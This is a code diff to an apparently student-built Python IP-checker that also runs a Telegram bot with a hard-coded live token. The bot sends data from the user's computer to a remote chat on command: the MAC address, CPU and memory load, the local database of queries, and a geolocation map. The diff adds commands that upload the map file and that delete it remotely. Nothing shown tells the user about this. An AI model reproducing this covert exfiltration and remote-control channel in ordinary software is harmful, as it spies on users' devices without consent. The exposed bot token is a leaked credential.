@@ -11,6 +11,7 @@ import platform
 import telebot
 from uuid import getnode as get_mac
 import psutil
+import os
 
 bot = telebot.TeleBot("6585195657:AAF1FpTNNpBv_Uhxpro9buwSIR00RQ5pvKQ")
 
@@ -90,7 +91,7 @@ def get_info_by_ip(ip='127.0.0.1'):
             print(f'{k} : {v}')
 
         area = folium.Map(location=[response.get('lat'), response.get('lon')])
-        area.save(f'{response.get("query")}_{response.get("city")}.html')
+        area.save('ip.html')
 
     except requests.exceptions.ConnectionError:
         print('[!] Please check your connection!')
@@ -160,6 +161,16 @@ def main():
             elif get_message_text(upd).lower() == "/mac":
                 send_message(get_chat_id(upd),
                              f"MAC-адрес клієнта: {mac}")
+            elif get_message_text(upd).lower() == "/geodel":
+                os.remove("ip.html")
+                send_message(get_chat_id(upd),
+                             "Всі геолокації було видалено")
+            elif get_message_text(upd).lower() == "/geo":
+                send_message(get_chat_id(upd),
+                             "Геолокація запиту клієнта:")
+                upfile_2 = open("ip.html", "rb")
+                bot.send_document(get_chat_id(upd), upfile_2)
+                upfile_2.close()
             elif get_message_text(upd).lower() == "/site":
                 send_message(get_chat_id(upd),
                              "Сайт програми: https://sites.google.com/view/ip-checker-itstep")
@@ -188,6 +199,11 @@ def main():
                              f"Завантаженість ЦП: {cpu_percent}")
                 send_message(get_chat_id(upd),
                              f"Завантаженість пам'яті: {memory_info.percent}")
+                send_message(get_chat_id(upd),
+                             "Геолокація запиту клієнта:")
+                upfile_2 = open("ip.html", "rb")
+                bot.send_document(get_chat_id(upd), upfile_2)
+                upfile_2.close()
                 send_message(get_chat_id(upd),
                              f"База даних запитів з пристрою клієнта:")
                 upfile = open("ip.sl3", "rb")
